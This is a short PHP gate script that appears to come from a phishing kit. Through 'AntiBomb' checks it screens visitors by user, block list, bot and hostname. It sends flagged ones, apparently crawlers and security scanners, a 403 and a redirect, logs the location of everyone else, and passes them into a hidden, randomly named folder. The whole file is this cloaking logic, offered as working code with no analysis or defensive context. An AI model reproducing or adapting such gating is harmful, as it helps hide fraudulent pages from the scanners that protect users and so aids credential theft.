<?php
/* Require Files */
	$page = 'check';
  require_once './q99550/init.php';

if(AntiBomb_User($user) == true || AntiBomb_Block($user) == true):
    header("HTTP/1.1 403 Forbidden");
    die(rediret($link)); /* We're done here */

	/* Require check */
elseif(AntiBomb_Boot($user) == true):
	AntiBomb_BootList($user);
    header("HTTP/1.1 403 Forbidden");
    die(rediret($link2)); /* We're done here */

elseif(AntiBomb_WordBoot($user) == true):
	AntiBomb_BootHostname($user);
    header("HTTP/1.1 403 Forbidden");
    die(rediret($link2)); /* We're done here */
else:
	$rootFolder='q99550';
	getLocation($user);
	_AntiBomb_User($user);
	die(rediret('./'.$rootFolder.'/index.php?valid=true&'.$id)); /* We're done here */
	ob_end_flush();
endif;
?>
